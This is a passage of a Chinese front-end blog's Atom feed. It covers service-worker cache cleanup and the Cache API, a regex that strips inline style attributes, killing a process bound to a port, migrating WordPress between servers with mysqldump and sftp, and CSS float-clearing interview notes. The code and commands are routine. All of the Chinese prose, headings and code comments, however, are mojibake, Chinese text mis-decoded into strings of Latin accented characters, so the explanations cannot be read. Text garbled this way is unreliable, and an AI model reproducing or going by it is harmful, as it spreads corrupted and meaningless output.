class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å¦‚æœè¯·æ±‚å›æ¥çš„ sw.js æœ‰æ”¹å˜ï¼Œåˆ™è§¦å‘ activate äº‹ä»¶ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åè§¦å‘ install äº‹ä»¶é‡æ–°æ‹‰å–æ–‡ä»¶è¿›è¡Œç¼“å­˜</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">self.addEventListener(<span class="string">'activate'</span>, event =&gt; &#123;</span><br><span class="line">  event.waitUntil(</span><br><span class="line">    caches.keys().then(</span><br><span class="line">      keys =&gt; <span class="built_in">Promise</span>.all(</span><br><span class="line">        keys</span><br><span class="line">        .filter(<span class="function"><span class="params">key</span> =&gt;</span> key !== CACHE_NAME)</span><br><span class="line">        .map(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// æŠŠæ—§çš„ç¼“å­˜å…¨éƒ¨åˆ æ‰ï¼Œä»¥å…å ç”¨ç©ºé—´</span></span><br><span class="line">          caches.delete(key);</span><br><span class="line">          log(<span class="string">'Delete cache'</span>, key);</span><br><span class="line">        &#125;)</span><br><span class="line">      )</span><br><span class="line">    ).then(self.skipWaiting)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p><img src="/images/sw1.png" alt=""></p><p><img src="/images/sw2.png" alt=""></p><p><img src="/images/sw3.png" alt=""></p><h3 id="ä¸€äº›æ–°çš„-API"><a href="#ä¸€äº›æ–°çš„-API" class="headerlink" title="ä¸€äº›æ–°çš„ API"></a>ä¸€äº›æ–°çš„ API</h3><p>Request</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Request <span class="keyword">extends</span> Object, Body &#123;</span><br><span class="line">    readonly cache: RequestCache;</span><br><span class="line">    readonly credentials: RequestCredentials;</span><br><span class="line">    readonly destination: RequestDestination;</span><br><span class="line">    readonly headers: Headers;</span><br><span class="line">    readonly integrity: <span class="built_in">string</span>;</span><br><span class="line">    readonly keepalive: <span class="built_in">boolean</span>;</span><br><span class="line">    readonly method: <span class="built_in">string</span>;</span><br><span class="line">    readonly mode: RequestMode;</span><br><span class="line">    readonly redirect: RequestRedirect;</span><br><span class="line">    readonly referrer: <span class="built_in">string</span>;</span><br><span class="line">    readonly referrerPolicy: ReferrerPolicy;</span><br><span class="line">    readonly <span class="keyword">type</span>: RequestType;</span><br><span class="line">    readonly url: <span class="built_in">string</span>;</span><br><span class="line">    clone(): Request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Resopnse</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Response <span class="keyword">extends</span> Object, Body &#123;</span><br><span class="line">    readonly body: ReadableStream | <span class="literal">null</span>;</span><br><span class="line">    readonly headers: Headers;</span><br><span class="line">    readonly ok: <span class="built_in">boolean</span>;</span><br><span class="line">    readonly status: <span class="built_in">number</span>;</span><br><span class="line">    readonly statusText: <span class="built_in">string</span>;</span><br><span class="line">    readonly <span class="keyword">type</span>: ResponseType;</span><br><span class="line">    readonly url: <span class="built_in">string</span>;</span><br><span class="line">    clone(): Response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cache æ˜¯ä¸€ä¸ªä¸“ä¸ºä¸º Request å’Œ Response å¯¹è±¡æä¾›ç¼“å­˜æœºåˆ¶çš„æ¥å£ï¼Œå®ƒå¯ä»¥æŠŠ Request å’Œ Response å¯¹è±¡ç¼“å­˜èµ·æ¥ï¼Œå¹¶ä¸”æä¾›ä¸€äº›å¾ˆæ–¹ä¾¿çš„ API ä¾›è°ƒç”¨ã€‚</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Cache &#123;</span><br><span class="line"> <span class="comment">// å•ä¸ªæ·»åŠ </span></span><br><span class="line">    add(request: RequestInfo): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</span><br><span class="line">    <span class="comment">// æ‰¹é‡æ·»åŠ </span></span><br><span class="line">    addAll(requests: RequestInfo[]): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</span><br><span class="line">    <span class="comment">// å•ä¸ªåˆ é™¤</span></span><br><span class="line">    <span class="keyword">delete</span>(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;<span class="built_in">boolean</span>&gt;;</span><br><span class="line">    <span class="comment">// è·å–å­˜å‚¨çš„æ‰€æœ‰å¯¹è±¡çš„ key</span></span><br><span class="line">    keys(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</span><br><span class="line">    <span class="comment">// æŸ¥çœ‹æ˜¯å¦å­˜æœ‰è¯¥å¯¹è±¡</span></span><br><span class="line">    match(request: RequestInfo, options?: CacheQueryOptions): <span class="built_in">Promise</span>&lt;Response&gt;;</span><br><span class="line">    <span class="comment">// æ‰¹é‡æŸ¥çœ‹æ˜¯å¦å­˜æœ‰è¿™äº›å¯¹è±¡</span></span><br><span class="line">    matchAll(request?: RequestInfo, options?: CacheQueryOptions): <span class="built_in">any</span>;</span><br><span class="line">    <span class="comment">// æ·»åŠ å¯¹è±¡</span></span><br><span class="line">    put(request: RequestInfo, response: Response): <span class="built_in">Promise</span>&lt;<span class="built_in">void</span>&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://x5.tencent.com/tbs/guide/serviceworker.html" target="_blank" rel="noopener">https://x5.tencent.com/tbs/guide/serviceworker.html</a></p><p><a href="https://alistapart.com/article/application-cache-is-a-douchebag" target="_blank" rel="noopener">https://alistapart.com/article/application-cache-is-a-douchebag</a></p><p><a href="http://harttle.com/2017/04/10/service-worker-update.html" target="_blank" rel="noopener">http://harttle.com/2017/04/10/service-worker-update.html</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜&quot;&gt;&lt;/a&gt;å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;ä»£ç†æœåŠ¡å™¨ç¼“å­˜&lt;/li&gt;
&lt;li&gt;CDN ç¼“å­˜&lt;/li&gt;
&lt;li&gt;æµè§ˆå™¨ç«¯ç¼“å­˜&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;æµè§ˆå™¨ç¼“å­˜&quot;&gt;&lt;a href=&quot;#æµè§ˆå™¨ç¼“å­˜&quot; class=&quot;headerlink&quot; title=&quot;æµè§ˆå™¨ç¼“å­˜&quot;&gt;&lt;/a&gt;æµè§ˆå™¨ç¼“å­˜&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cache-Control: max-age=3600(s) | no-cache | no-store&lt;/li&gt;
&lt;li&gt;Pragma: no-cache | Pragma&lt;/li&gt;
&lt;li&gt;Expires: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT&lt;/li&gt;
&lt;li&gt;Etag: â€œv2.6â€&lt;/li&gt;
&lt;li&gt;If-None-Match: â€œv2.6â€&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;no-cache æ˜¯å…è®¸ç¼“å­˜çš„ï¼Œä½†æ˜¯ä½¿ç”¨ç¼“å­˜ä¹‹å‰å¿…é¡»å’ŒæœåŠ¡å™¨è¿›è¡Œæ–°é²œåº¦å¯¹æ¯”ï¼Œno-store æ‰æ˜¯ç¦æ­¢ç¼“å­˜ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Service Workers" scheme="http://youngdze.co/tags/Service-Workers/"/>
    
  </entry>
  
  <entry>
    <title>æ­£åˆ™åŒ¹é… XML é‡Œé¢çš„å±æ€§</title>
    <link href="http://youngdze.co/2016/03/07/regex-match-xml-attribute/"/>
    <id>http://youngdze.co/2016/03/07/regex-match-xml-attribute/</id>
    <published>2016-03-07T01:27:10.000Z</published>
    <updated>2016-12-08T05:25:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘é‡åˆ°äº†è¿™ä¹ˆä¸€æ®µå­—ç¬¦ä¸²ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>vipèŒƒå›´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸Šæ¶èµ·å§‹æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸Šæ¶é“å…·ID<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>ä¸‹æ¶æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"</span>&gt;</span>å……å€¼æ—¶é—´<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨éœ€è¦åšçš„æ˜¯æŠŠ <code>tag</code> é‡Œé¢çš„ <code>style</code> å±æ€§å…¨éƒ¨å»æ‰å˜æˆè¿™æ · <code>&lt;p&gt;...&lt;/p&gt;</code>ã€‚</p><p>è¿™é‡Œå¯ä»¥ç”¨çš„æ­£åˆ™æ˜¯ <code>/\sstyle=&quot;[^&quot;]*&quot;/ig</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">`&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;vipèŒƒå›´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸Šæ¶èµ·å§‹æ—¶é—´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸Šæ¶é“å…·ID&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;ä¸‹æ¶æ—¶é—´&lt;/p&gt;&lt;p style="font-size: 12px; line-height: 12px; font-family: PingHei, Myriad Set Pro, Hiragino Sans GB, Microsoft Yahei, STHeiti, Helvetica, Arial, Verdana, sans-serif;"&gt;å……å€¼æ—¶é—´&lt;/p&gt;`</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="regexp">/\sstyle="[^"]*"/ig</span>;</span><br><span class="line">str.replace(reg, <span class="string">''</span>);    <span class="comment">// "&lt;p&gt;vipèŒƒå›´&lt;/p&gt;&lt;p&gt;ä¸Šæ¶èµ·å§‹æ—¶é—´&lt;/p&gt;&lt;p&gt;ä¸Šæ¶é“å…·ID&lt;/p&gt;&lt;p&gt;ä¸‹æ¶æ—¶é—´&lt;/p&gt;&lt;p&gt;å……å€¼æ—¶é—´&lt;/p&gt;"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æˆ‘é‡åˆ°äº†è¿™ä¹ˆä¸€æ®µå­—ç¬¦ä¸²ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;c
      
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Regex" scheme="http://youngdze.co/tags/Regex/"/>
    
  </entry>
  
  <entry>
    <title>æ€æ‰å ç”¨æŸä¸ªç«¯å£çš„è¿›ç¨‹</title>
    <link href="http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/"/>
    <id>http://youngdze.co/2016/01/16/kill-daemon-of-specified-port/</id>
    <published>2016-01-16T10:16:08.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntu</span><br><span class="line">lsof -i:[PORT]</span><br><span class="line"><span class="built_in">kill</span> [PID]</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h4><ul><li><a href="http://superuser.com/questions/529830/get-a-list-of-open-ports-in-linux" target="_blank" rel="noopener">Get a list of Open Ports in Linux</a></li><li><a href="http://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux" target="_blank" rel="noopener">How to kill a process running on particular port in Linux?</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ“ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>åœ¨æœåŠ¡å™¨é—´è¿ç§» wordpress</title>
    <link href="http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/"/>
    <id>http://youngdze.co/2015/10/26/migrate-wordpress-between-severs/</id>
    <published>2015-10-26T02:04:04.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å°è¯•æŠŠåšå®¢ä» SAE è¿åˆ°é˜¿é‡Œäº‘ï¼Œè¿‡ç¨‹æœ‰äº›å°ç£•ç¢°ï¼Œä¸è¿‡è¿˜æ˜¯æˆåŠŸäº†ï¼Œè®°å½•ä¸‹ã€‚</p><h4 id="è¿ç§»æ•°æ®åº“"><a href="#è¿ç§»æ•°æ®åº“" class="headerlink" title="è¿ç§»æ•°æ®åº“"></a>è¿ç§»æ•°æ®åº“</h4><p>SAE æ•°æ®åº“æ˜¯ MySQLï¼Œç”±äºæˆ‘æ•°æ®è¿‡äºåºå¤§ï¼Œä¸èƒ½é€šè¿‡ phpMyAdmin å¯¼å‡ºï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨äº† SAE çš„ <a href="http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob" target="_blank" rel="noopener">DeferredJob</a> åŠŸèƒ½è¿›è¡Œæ•°æ®åº“å¯¼å‡ºã€‚ <a id="more"></a></p><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯è‡ªå·±çš„æ•°æ®åº“å¯¼å‡ºå°±ç®€å•å¤šäº†ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u USERNAME -p DATABASE_NAME &gt; OUTPUT.sql</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>gzip</code> å‹ç¼©ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u USERNAME -p DATABASE_NAME | gzip &gt; OUTPUT.sql.gz</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºåä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæˆ‘ç”¨çš„æ˜¯ <a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="noopener">sftp</a> ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sftp username@host</span><br><span class="line">put saeOutput.sql</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ç›®æ ‡æœåŠ¡å™¨ MySQL å¯¼å…¥ï¼Œä¸è¿‡å¾—å…ˆåœ¨ MySQL å‘½ä»¤ç•Œé¢åˆ›å»ºä¸ªæ•°æ®åº“æ¥ä¿å­˜è¿™ä»½æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> wp;</span><br></pre></td></tr></table></figure><p>æœ€åå¯¼å…¥æ•°æ®ï¼Œè¿™æ˜¯åœ¨ <code>sh</code> ç•Œé¢ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u USERNAME -p TARGET_DATABASE_NAME &lt; saeOutput.sql</span><br></pre></td></tr></table></figure><h4 id="è¿ç§»-wordpress-æ–‡ä»¶"><a href="#è¿ç§»-wordpress-æ–‡ä»¶" class="headerlink" title="è¿ç§» wordpress æ–‡ä»¶"></a>è¿ç§» wordpress æ–‡ä»¶</h4><p>æŠŠæ•´ä¸ª wordpress æ–‡ä»¶å¤¹å¤åˆ¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œåœ¨ <code>wp-config.php</code> ä¿®æ”¹ä¸‹æ•°æ®åº“é…ç½®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'DB_NAME'</span>, MYSQL_DB);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, MYSQL_USER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, MYSQL_PASS);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, MYSQL_HOST_M.<span class="string">':'</span>.MYSQL_PORT);</span><br></pre></td></tr></table></figure><h4 id="æ”¹-URL"><a href="#æ”¹-URL" class="headerlink" title="æ”¹ URL"></a>æ”¹ URL</h4><p>éœ€è¦æ”¹åŸŸåçš„è¯åœ¨å½“å‰ä¸»é¢˜çš„ <code>functions.php</code> ä¸‹æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update_option(<span class="string">'siteurl'</span>,<span class="string">'http://foo.bar'</span>);</span><br><span class="line">update_option(<span class="string">'home'</span>,<span class="string">'http://foo.bar'</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®è¯¥ wordpress ç›®å½•åœ¨æœåŠ¡å™¨çš„è·¯å¾„å³å¯æˆåŠŸæ”¹åŸŸåï¼Œä¹‹åå°±å¯ä»¥æŠŠä»¥ä¸Šä»£ç åˆ æ‰äº†ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/" target="_blank" rel="noopener">http://www.sitepoint.com/move-wordpress-new-server-without-losing-anything/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æˆ‘å°è¯•æŠŠåšå®¢ä» SAE è¿åˆ°é˜¿é‡Œäº‘ï¼Œè¿‡ç¨‹æœ‰äº›å°ç£•ç¢°ï¼Œä¸è¿‡è¿˜æ˜¯æˆåŠŸäº†ï¼Œè®°å½•ä¸‹ã€‚&lt;/p&gt;
&lt;h4 id=&quot;è¿ç§»æ•°æ®åº“&quot;&gt;&lt;a href=&quot;#è¿ç§»æ•°æ®åº“&quot; class=&quot;headerlink&quot; title=&quot;è¿ç§»æ•°æ®åº“&quot;&gt;&lt;/a&gt;è¿ç§»æ•°æ®åº“&lt;/h4&gt;&lt;p&gt;SAE æ•°æ®åº“æ˜¯ MySQLï¼Œç”±äºæˆ‘æ•°æ®è¿‡äºåºå¤§ï¼Œä¸èƒ½é€šè¿‡ phpMyAdmin å¯¼å‡ºï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨äº† SAE çš„ &lt;a href=&quot;http://www.sinacloud.com/doc/sae/php/mysql.html#deferredjob&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;DeferredJob&lt;/a&gt; åŠŸèƒ½è¿›è¡Œæ•°æ®åº“å¯¼å‡ºã€‚
    
    </summary>
    
      <category term="PHP" scheme="http://youngdze.co/categories/PHP/"/>
    
    
      <category term="wordpress" scheme="http://youngdze.co/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘é‡åˆ°çš„å‰ç«¯é¢è¯•é—®é¢˜</title>
    <link href="http://youngdze.co/2015/10/23/front-end-interview-q-a/"/>
    <id>http://youngdze.co/2015/10/23/front-end-interview-q-a/</id>
    <published>2015-10-22T16:26:41.000Z</published>
    <updated>2017-08-13T11:06:29.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ¸…é™¤æµ®åŠ¨"><a href="#æ¸…é™¤æµ®åŠ¨" class="headerlink" title="æ¸…é™¤æµ®åŠ¨"></a>æ¸…é™¤æµ®åŠ¨</h4><h5 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ”¾åœ¨æµ®åŠ¨å…ƒç´ ä¹‹åæ¸…é™¤æµ®åŠ¨ */</span></span><br><span class="line"><span class="selector-class">.clear</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h5 id="æ„é€ -BFC"><a href="#æ„é€ -BFC" class="headerlink" title="æ„é€  BFC"></a>æ„é€  BFC</h5><p>æœ‰å…³ BFC çš„çŸ¥è¯†åœ¨ä¸‹é¢æœ‰è¯´ï¼Œ<code>overflow</code> ä¸ä¸º <code>visible</code> å¯æ„é€ ä¸€ä¸ª BFCã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="clearfix"><a href="#clearfix" class="headerlink" title="clearfix"></a>clearfix</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span> &#123;</span><br><span class="line">    &amp;:before,</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">        <span class="attribute">display</span>: table;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">clear</span>: both;</span><br><span class="line">    &#125;</span><br><span class="line">    zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­"><a href="#åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­" class="headerlink" title="åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­"></a>åœ¨æµ®åŠ¨å±‚å†…å‚ç›´å±…ä¸­</h4><p>ç»™æµ®åŠ¨å±‚åŒ…å«ä¸ª <code>div</code>ï¼Œç”±äº <code>inline-block</code> ç›´æ¥ä¼šäº§ç”Ÿç©ºéš™ï¼Œæ¶ˆé™¤æ³•çœ‹ä¸‹é¢ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    &amp;&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">        <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">        <span class="selector-class">.left</span> &#123;</span><br><span class="line">            <span class="attribute">float</span>: left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-class">.right</span> &#123;</span><br><span class="line">            <span class="attribute">float</span>: right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º <code>table</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: table-row;</span><br><span class="line">    <span class="selector-class">.left</span>,</span><br><span class="line">    <span class="selector-class">.right</span> &#123;</span><br><span class="line">        <span 